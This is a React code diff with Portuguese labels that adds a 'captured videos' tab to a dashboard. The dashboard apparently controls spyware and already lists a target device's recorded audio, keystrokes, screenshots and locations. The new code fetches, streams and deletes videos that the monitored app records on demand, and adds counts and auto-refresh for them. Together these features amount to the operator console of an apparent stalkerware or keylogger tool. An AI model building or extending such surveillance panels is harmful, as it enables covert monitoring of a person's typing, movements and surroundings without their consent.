@@ -93,6 +93,12 @@ export default function App() {
   const [devices, setDevices] = useState([]);
   const [loadingDev, setLoadingDev] = useState(false);
 
+  const [videos, setVideos] = useState([]);
+  const [vidPage, setVidPage] = useState(1);
+  const [vidPagination, setVidPagination] = useState({ page: 1, totalPages: 1, total: 0 });
+  const [loadingVid, setLoadingVid] = useState(false);
+  const [selectedVideo, setSelectedVideo] = useState(null);
+
   const fetchAll = useCallback(async () => {
     setError(null); setLoadingStats(true);
     try { const r = await axios.get(`${API_BASE}/stats`); setStats(r.data); setLastRefresh(new Date()); }
@@ -135,11 +141,19 @@ export default function App() {
     finally { setLoadingDev(false); }
   }, []);
 
+  const fetchVideos = useCallback(async (page = 1) => {
+    setLoadingVid(true);
+    try { const r = await axios.get(`${API_BASE}/videos`, { params: { page, limit: 12 } }); setVideos(r.data.videos); setVidPagination(r.data.pagination); }
+    catch (err) { setError(err?.response?.data?.error || 'Erro'); }
+    finally { setLoadingVid(false); }
+  }, []);
+
   useEffect(() => { fetchAll(); fetchRecordings(1); }, [fetchAll, fetchRecordings]);
   useEffect(() => { if (activeTab === 'keystrokes') fetchKeystrokes(keyPage); }, [activeTab, keyPage, fetchKeystrokes]);
   useEffect(() => { if (activeTab === 'locations') fetchLocations(locPage); }, [activeTab, locPage, fetchLocations]);
   useEffect(() => { if (activeTab === 'screenshots') fetchScreenshots(ssPage); }, [activeTab, ssPage, fetchScreenshots]);
   useEffect(() => { if (activeTab === 'devices') fetchDevices(); }, [activeTab, fetchDevices]);
+  useEffect(() => { if (activeTab === 'videos') fetchVideos(vidPage); }, [activeTab, vidPage, fetchVideos]);
 
   useEffect(() => {
     const interval = setInterval(() => {
@@ -150,10 +164,11 @@ export default function App() {
         case 'locations': fetchLocations(locPage); break;
         case 'screenshots': fetchScreenshots(ssPage); break;
         case 'devices': fetchDevices(); break;
+        case 'videos': fetchVideos(vidPage); break;
       }
     }, AUTO_REFRESH_MS);
     return () => clearInterval(interval);
-  }, [activeTab, recPage, keyPage, locPage, ssPage, fetchAll, fetchRecordings, fetchKeystrokes, fetchLocations, fetchScreenshots, fetchDevices]);
+  }, [activeTab, recPage, keyPage, locPage, ssPage, vidPage, fetchAll, fetchRecordings, fetchKeystrokes, fetchLocations, fetchScreenshots, fetchDevices, fetchVideos]);
 
   const handleDeleteRecording = async (id, fn) => {
     if (!window.confirm(`Deletar gravação ${shortId(id)} (${fn})?`)) return;
@@ -189,10 +204,21 @@ export default function App() {
     catch (err) { alert('Erro'); }
   };
 
+  const handleDeleteVideo = async (id) => {
+    if (!window.confirm(`Deletar vídeo ${shortId(id)}?`)) return;
+    try { await axios.delete(`${API_BASE}/videos/${id}`); fetchVideos(vidPage); fetchAll(); }
+    catch (err) { alert(err?.response?.data?.error || 'Erro'); }
+  };
+
+  const handleViewVideo = async (id) => {
+    try { const r = await axios.get(`${API_BASE}/videos/${id}`); setSelectedVideo(r.data.video); }
+    catch (err) { alert('Erro'); }
+  };
+
   const tabs = [
     { key: 'recordings', label: '🎤 Áudio' }, { key: 'keystrokes', label: '⌨️ Keystrokes' },
-    { key: 'screenshots', label: '📸 Screenshots' }, { key: 'locations', label: '📍 Localizações' },
-    { key: 'devices', label: '📱 Dispositivos' },
+    { key: 'screenshots', label: '📸 Screenshots' }, { key: 'videos', label: '🎥 Vídeos' },
+    { key: 'locations', label: '📍 Localizações' }, { key: 'devices', label: '📱 Dispositivos' },
   ];
 
   return (
@@ -212,6 +238,7 @@ export default function App() {
                 case 'locations': fetchLocations(locPage); break;
                 case 'screenshots': fetchScreenshots(ssPage); break;
                 case 'devices': fetchDevices(); break;
+                case 'videos': fetchVideos(vidPage); break;
               }
             }} disabled={loadingStats}>{loadingStats ? '…' : '↻ Atualizar'}</button>
           </div>
@@ -227,6 +254,7 @@ export default function App() {
             <div className="stat-card"><div className="stat-value">{stats.screenshots?.total || 0}</div><div className="stat-label">Screenshots</div></div>
             <div className="stat-card"><div className="stat-value">{stats.locations?.total || 0}</div><div className="stat-label">Localizações</div></div>
             <div className="stat-card"><div className="stat-value">{stats.devices?.total || 0}</div><div className="stat-label">Dispositivos</div></div>
+            <div className="stat-card"><div className="stat-value">{stats.videos?.total || 0}</div><div className="stat-label">Vídeos</div></div>
           </div>
         )}
 
@@ -339,6 +367,48 @@ export default function App() {
                       style={{ maxWidth: '100%', maxHeight: '70vh', borderRadius: 8, border: '1px solid var(--border)' }} />
                   ) : (
                     <div className="empty-state"><p>Imagem não disponível</p></div>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+        </>)}
+
+        {/* ─── VÍDEOS ─── */}
+        {activeTab === 'videos' && (<>
+          <DataTable title="Vídeos Capturados" count={vidPagination.total} data={videos} loading={loadingVid}
+            emptyMessage="Nenhum vídeo. O app captura vídeo sob demanda." emptyIcon="🎥"
+            columns={[
+              { key: 'id', label: 'ID', render: v => <span className="id-badge" title={v.id}>{shortId(v.id)}</span> },
+              { key: 'size_bytes', label: 'Tamanho', render: v => formatBytes(v.size_bytes) },
+              { key: 'mime_type', label: 'Formato', render: v => v.mime_type || '—' },
+              { key: 'captured_at', label: 'Capturado em', render: v => formatDateTime(v.captured_at) },
+            ]}
+            renderActions={v => (<>
+              <button className="btn btn-small btn-play" onClick={() => handleViewVideo(v.id)} title="Ver">▶ Ver</button>
+              <button className="btn btn-small btn-danger" onClick={() => handleDeleteVideo(v.id)} title="Deletar">✕</button>
+            </>)}
+          />
+          {vidPagination.totalPages > 1 && (
+            <div className="pagination" style={{ marginTop: -12, marginBottom: 24 }}>
+              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(1)} disabled={vidPage === 1}>«</button>
+              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(vidPage - 1)} disabled={vidPage === 1}>‹</button>
+              <span className="page-info">Página {vidPage} de {vidPagination.totalPages}</span>
+              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(vidPage + 1)} disabled={vidPage === vidPagination.totalPages}>›</button>
+              <button className="btn btn-secondary btn-small" onClick={() => setVidPage(vidPagination.totalPages)} disabled={vidPage === vidPagination.totalPages}>»</button>
+            </div>
+          )}
+          {selectedVideo && (
+            <div className="modal-overlay" onClick={() => setSelectedVideo(null)}>
+              <div className="modal modal-large" onClick={e => e.stopPropagation()}>
+                <div className="modal-header"><h3>Vídeo</h3><button className="btn btn-small btn-ghost" onClick={() => setSelectedVideo(null)}>✕</button></div>
+                <div className="modal-body" style={{ textAlign: 'center' }}>
+                  <p style={{ color: 'var(--text-muted)', fontSize: 12, marginBottom: 8 }}>Capturado: {formatDateTime(selectedVideo.captured_at)} · {formatBytes(selectedVideo.size_bytes)}</p>
+                  {selectedVideo.id ? (
+                    <video controls style={{ maxWidth: '100%', maxHeight: '60vh', borderRadius: 8, border: '1px solid var(--border)' }}
+                      src={`${API_BASE}/videos/${selectedVideo.id}/stream`} />
+                  ) : (
+                    <div className="empty-state"><p>Vídeo não disponível</p></div>
                   )}
                 </div>
               </div>
